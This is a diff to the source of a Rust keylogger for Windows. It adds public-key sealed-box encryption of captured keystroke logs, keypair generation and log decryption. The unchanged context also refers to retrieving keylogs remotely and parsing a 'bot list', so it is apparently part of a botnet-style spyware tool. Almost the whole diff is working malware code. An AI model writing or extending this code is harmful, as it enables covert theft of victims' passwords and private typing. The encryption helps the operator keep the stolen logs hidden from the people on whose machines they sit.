@@ -8,12 +8,32 @@ mod win_key_codes;
 
 use win_key_codes::*;
 use sodiumoxide::crypto::secretbox;
+use sodiumoxide::crypto::sealedbox;
+use sodiumoxide::crypto::box_;
 
 use std::io::Write;
 use std::io::Read;
 use std::collections::HashMap;
 
-pub fn key_log(key_path: &str) {
+const LOG_LINE_LENGTH: usize = 140;
+
+//pub struct KeysInput<'a> {
+//    secret_key_path: &'a str,
+//    public_key_path: &'a str,
+//    asymmetric: bool,
+//}
+
+pub fn key_log(key_path: &str, asym: bool) {
+//    sodiumoxide::init();
+//    println!("{}", sodiumoxide::version::version_string());
+//    let (pub_key_1, sec_key_1) = box_::gen_keypair();
+//    let encrypted = sealedbox::seal(b"abcdefg",&pub_key_1);
+//    print_in_hex(&encrypted);
+//    println!("{}", encrypted.len());
+//
+//    let decrypted = sealedbox::open(encrypted.as_ref(),&pub_key_1, &sec_key_1).expect("Decryption Error");
+//    print_in_hex(&decrypted);
+//    return;
     let mut to_write_queue = String::new();
 
     let mut key_downed: HashMap<u8, bool> = HashMap::new();
@@ -65,36 +85,44 @@ pub fn key_log(key_path: &str) {
                                           current_str.to_uppercase());
                     current_str += "\n";
                 }
-                save_string_to_queue(&current_str, &mut to_write_queue, key_path)
+                save_string_to_queue(&current_str, &mut to_write_queue, key_path, asym)
             }
         }
     }
 }
 
-fn save_string_to_queue(to_write: &String, string_queue: &mut String, key_loc: &str) {
+fn save_string_to_queue(to_write: &String, string_queue: &mut String, key_loc: &str, asym: bool) {
     if to_write.is_empty() { return; }
     string_queue.push_str(to_write);
 
     if string_queue.len() < 100 { return; }
-    let string_queue_owned = pad(string_queue, 144, '-', true);
-
+    let string_queue_owned = pad(string_queue, LOG_LINE_LENGTH, '-', true);
     string_queue.clear();
+    save_encrypted_to_disk(if asym { encrypt_asym(&string_queue_owned, key_loc) } else { encrypt_sym(&string_queue_owned, key_loc) })
+}
 
-    let (key, nonce) = generate_key_and_nonce(key_loc).expect("Key file modified");
+fn encrypt_sym(string_queue_owned: &str, key_loc: &str) -> Vec<u8> {
+    let (key, nonce) = generate_key_and_nonce(key_loc).expect("Key file incorrect");
+    let mut output: Vec<u8> = nonce[..].to_vec();
+    output.extend(secretbox::seal(string_queue_owned.as_bytes(), &nonce, &key));
+    output
+}
 
-    let encrypted = secretbox::seal(string_queue_owned.as_bytes(), &nonce, &key);
+fn encrypt_asym(string_queue_owned: &str, key_loc: &str) -> Vec<u8> {
+    let pub_key = get_public_key(key_loc).expect("Key file incorrect");
+    sealedbox::seal(string_queue_owned.as_bytes(), &pub_key)
+}
 
+fn save_encrypted_to_disk(data_to_write: Vec<u8>) {
     let now = time::now();
-
     std::fs::create_dir("./logs").unwrap_or_default();
-
     let mut file = std::fs::OpenOptions::new()
         .write(true)
         .append(true)
         .create(true)
         .open(format!("./logs/{:05}-{:02}-{:02}_Keylogs.crypt", now.tm_year + 11900, now.tm_mon, now.tm_mday)).expect("Failed to open file");
 
-    file.write([&nonce[..], encrypted.as_ref()].concat().as_ref()).expect("Can't write to file");
+    file.write(data_to_write.as_ref()).expect("Can't write to file");
 }
 
 fn pad(original: &String, width: usize, pad_char: char, truncate: bool) -> String {
@@ -105,6 +133,39 @@ fn pad(original: &String, width: usize, pad_char: char, truncate: bool) -> Strin
     s
 }
 
+pub fn get_public_key(pub_key_loc: &str) -> Result<box_::PublicKey, Box<std::error::Error>> {
+    let mut contents = Vec::new();
+    std::fs::File::open(pub_key_loc)?.read_to_end(&mut contents)?;//.expect("File read error");
+
+    let key = box_::PublicKey::from_slice(&contents[..]).ok_or("Key not the correct size")?;
+
+    return Ok(key);
+}
+
+pub fn gen_key_pair(pub_key_loc: &str, sec_key_loc: &str) -> Result<(), Box<std::error::Error>> {
+    use sodiumoxide::crypto::box_;
+    let (pub_key, sec_key) = box_::gen_keypair();
+
+    let mut creation_options = std::fs::OpenOptions::new();
+
+    creation_options
+        .create_new(true)
+        .write(true);
+
+    creation_options
+        .open(pub_key_loc)
+        .or_else(|e| Err(format!("File already exists? : {}", e.to_string())))?
+        .write(&pub_key[..])?;
+
+    creation_options
+        .open(sec_key_loc)
+        .or_else(|e| Err(format!("File already exists? : {}", e.to_string())))?
+        .write(&sec_key[..])?;
+
+    Ok(())
+}
+
+// TODO: Split this so that key generation and key retrieval is separated
 pub fn generate_key_and_nonce(key_loc: &str) -> Result<(secretbox::Key, secretbox::Nonce), Box<std::error::Error>> {
     if let Ok(mut file) = std::fs::File::open(key_loc) {
         let mut contents = Vec::new();
@@ -127,8 +188,44 @@ pub fn generate_key_and_nonce(key_loc: &str) -> Result<(secretbox::Key, secretbo
     }
 }
 
+pub fn decrypt_asym(log_file_path: &str, pub_key_path: &str, sec_key_path: &str) -> Result<(), Box<std::error::Error>> {
+    use std::io::Read;
+    use std::io::BufRead;
+
+    let (pub_key, sec_key) = {
+        let mut pub_contents = Vec::new();
+        let mut sec_contents = Vec::new();
+        std::fs::File::open(pub_key_path)?.read_to_end(&mut pub_contents)?;
+        std::fs::File::open(sec_key_path)?.read_to_end(&mut sec_contents)?;
+        (box_::PublicKey::from_slice(&pub_contents[..(box_::PUBLICKEYBYTES)]).ok_or("Public key not the correct size")?,
+         box_::SecretKey::from_slice(&sec_contents[..(box_::SECRETKEYBYTES)]).ok_or("Private key not the correct size")?)
+    };
+
+    let mut log_file = std::io::BufReader::with_capacity(LOG_LINE_LENGTH + 48, std::fs::File::open(&log_file_path).expect("Log file not found"));
+
+    println!("{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
+    println!("\n    Now reading from: {}\n", log_file_path);
+    println!("{}\n", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
+
+    loop {
+        let buffer_length = {
+            let data = log_file.fill_buf().expect("Read buffer failed");
+            if data.len() == 0 { break; }
+            //let nonce = box_::Nonce::from_slice(&data[..box_::NONCEBYTES]).expect("Nonce parse fail");
+            let answer = sealedbox::open(data, &pub_key, &sec_key).expect("Decrypt fail");
+            //answer.truncate(box_::NONCEBYTES);
+            let answer = String::from_utf8(answer).expect("Utf8 parse problem");
+            println!("{}", answer);
+            data.len()
+        };
+        log_file.consume(buffer_length);
+    }
+    println!("\n{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
+    Ok(())
+}
+
 //TODO: Distill this function so that no file load happens here
-pub fn decrypt(log_file_path: &str, key_file_path: &str) -> Result<(), Box<std::error::Error>> {
+pub fn decrypt_sym(log_file_path: &str, key_file_path: &str) -> Result<(), Box<std::error::Error>> {
     use std::io::Read;
     use std::io::BufRead;
     let key: secretbox::Key = {
@@ -136,8 +233,7 @@ pub fn decrypt(log_file_path: &str, key_file_path: &str) -> Result<(), Box<std::
         std::fs::File::open(key_file_path)?.read_to_end(&mut contents)?;
         secretbox::Key::from_slice(&contents[..(secretbox::KEYBYTES)]).ok_or("Key not the correct size")?
     };
-
-    let mut file = std::io::BufReader::with_capacity(160 + secretbox::NONCEBYTES, std::fs::File::open(&log_file_path).expect("Log file not found"));
+    let mut file = std::io::BufReader::with_capacity(LOG_LINE_LENGTH + secretbox::MACBYTES + secretbox::NONCEBYTES, std::fs::File::open(&log_file_path).expect("Log file not found"));
 
     println!("{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
     println!("\n    Now reading from: {}\n", log_file_path);
@@ -146,7 +242,6 @@ pub fn decrypt(log_file_path: &str, key_file_path: &str) -> Result<(), Box<std::
         let buffer_length = {
             let data = file.fill_buf().expect("Read buffer failed");
             if data.len() == 0 { break; }
-
             let nonce = secretbox::Nonce::from_slice(&data[..secretbox::NONCEBYTES]).expect("Nonce parse fail");
             let answer = secretbox::open(&data[secretbox::NONCEBYTES..], &nonce, &key).expect("Decrypt fail");
             let answer = String::from_utf8(answer).expect("Utf8 parse problem");
@@ -202,6 +297,7 @@ pub fn retrieve_remote_keylogs(addr: &str) -> Vec<(String, Vec<u8>)> {
 
 
 pub fn parse_bot_list(bot_list_path: &str) -> Result<Vec<String>, Box<std::error::Error>> {
+    println!("{}", secretbox::MACBYTES);
     let mut list_data = String::new();
     std::fs::File::open(bot_list_path)?.read_to_string(&mut list_data)?;
     Ok(list_data.split("\n").map(|s: &str| s.trim().to_owned()).collect::<Vec<String>>())
